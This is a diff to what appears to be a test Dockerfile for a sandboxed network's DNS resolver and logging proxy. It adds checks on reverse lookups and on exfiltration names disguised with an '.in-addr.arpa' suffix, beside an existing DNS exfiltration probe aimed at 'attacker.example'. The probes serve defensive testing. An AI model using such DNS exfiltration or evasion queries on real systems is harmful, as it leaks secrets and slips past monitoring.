@@ -241,6 +241,25 @@ RUN echo "=== [DNS-only exfiltration] ===" && \
     (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true) && \
     echo "queried"
 
+# [Reverse lookup]
+# Nothing in the cage has a name, so the only question is how the lookup ends.
+# A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
+# as a server that may yet answer: it retries and then waits out its whole
+# five-second timeout, once for every tool that reverse-resolves its own
+# address or the gateway's. NXDOMAIN is final and costs nothing.
+RUN echo "=== [Reverse lookup] ===" && \
+    OUT=$(nslookup 172.20.0.1 2>&1 || true) && \
+    echo "$OUT" && \
+    case "$OUT" in *NXDOMAIN*) echo "OK" ;; *) echo "FAILED: expected NXDOMAIN" && exit 1 ;; esac
+
+# [Reverse zone, invented name]
+# Only a name that is an address backwards counts as a reverse lookup. The verb
+# those are logged under is one the report drops, so appending `.in-addr.arpa`
+# to an exfiltration name must not be a way out of the report.
+RUN echo "=== [Reverse zone, invented name] ===" && \
+    (nslookup SECRET-IN-A-NAME.in-addr.arpa >/dev/null 2>&1 || true) && \
+    echo "queried"
+
 # [A rule may name an address, and it stays inspected]
 # No resolver can answer an address, so the proxy takes one in the Host header
 # as it stands rather than asking. Without that a rule naming an address could
